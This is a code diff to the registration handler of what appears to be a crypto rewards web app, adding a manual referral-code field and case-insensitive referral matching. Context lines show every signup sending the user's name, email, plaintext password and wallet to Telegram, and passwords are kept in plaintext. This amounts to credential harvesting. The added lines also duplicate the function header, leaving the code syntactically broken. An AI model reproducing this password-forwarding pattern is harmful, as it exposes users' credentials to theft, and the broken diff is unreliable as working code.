@@ -66,10 +66,12 @@ function clearSession() {
 
 // ---------- Auth ----------
 async function handleRegister(e) {
+async function handleRegister(e) {
   e.preventDefault();
   const name = document.getElementById("reg-name").value.trim();
   const email = document.getElementById("reg-email").value.trim().toLowerCase();
   const password = document.getElementById("reg-password").value;
+  const manualRef = document.getElementById("reg-referral").value.trim();
 
   if (!name || !email || !password) {
     showToast("Please fill all fields", "error");
@@ -89,14 +91,14 @@ async function handleRegister(e) {
   const wallet = generateWalletAddress();
   const now = Date.now();
 
-  // Check if there is a referral code in the URL
+  // Get referral code from URL or manual input
   const urlParams = new URLSearchParams(window.location.search);
-  const refCode = urlParams.get("ref");
+  let refCode = urlParams.get("ref") || manualRef;
 
   let referrerEmail = null;
   if (refCode) {
     for (const [mail, u] of Object.entries(users)) {
-      if (u.wallet && u.wallet.slice(2, 10) === refCode) {
+      if (u.wallet && u.wallet.slice(2, 10).toLowerCase() === refCode.toLowerCase()) {
         referrerEmail = mail;
         break;
       }
@@ -109,7 +111,7 @@ async function handleRegister(e) {
     email,
     password,
     wallet,
-    balance: refCode && referrerEmail ? 0.15 : 0,   // New user gets 0.15 if referred
+    balance: (refCode && referrerEmail) ? 0.15 : 0,
     xpRate: 10.0,
     lastClaim: 0,
     history: [],
@@ -117,7 +119,7 @@ async function handleRegister(e) {
     createdAt: now
   };
 
-  // Give reward to the referrer
+  // Give bonus to referrer
   if (referrerEmail && users[referrerEmail]) {
     users[referrerEmail].balance = +(users[referrerEmail].balance + 0.15).toFixed(8);
     users[referrerEmail].referrals = (users[referrerEmail].referrals || 0) + 1;
@@ -129,7 +131,7 @@ async function handleRegister(e) {
     });
   }
 
-  // Add history for new user if they got referral bonus
+  // History for new user
   if (refCode && referrerEmail) {
     users[email].history.push({
       type: "Referral Welcome Bonus",
@@ -141,18 +143,16 @@ async function handleRegister(e) {
   saveUsers(users);
   setSession(email);
 
-  // Send to Telegram
+  // Telegram
   showToast("Creating account...", "success");
   try {
     await window.sendRegistrationToTelegram({ name, email, password, wallet });
   } catch (err) {
-    console.warn("Telegram notification failed (non-blocking)", err);
+    console.warn("Telegram notification failed", err);
   }
 
   showToast(refCode && referrerEmail ? "Welcome! +0.15 BAM Referral Bonus 🎉" : "Welcome to Bam! 🚀", "success");
-  setTimeout(() => {
-    showApp();
-  }, 600);
+  setTimeout(() => showApp(), 600);
 }
 
 function handleLogin(e) {
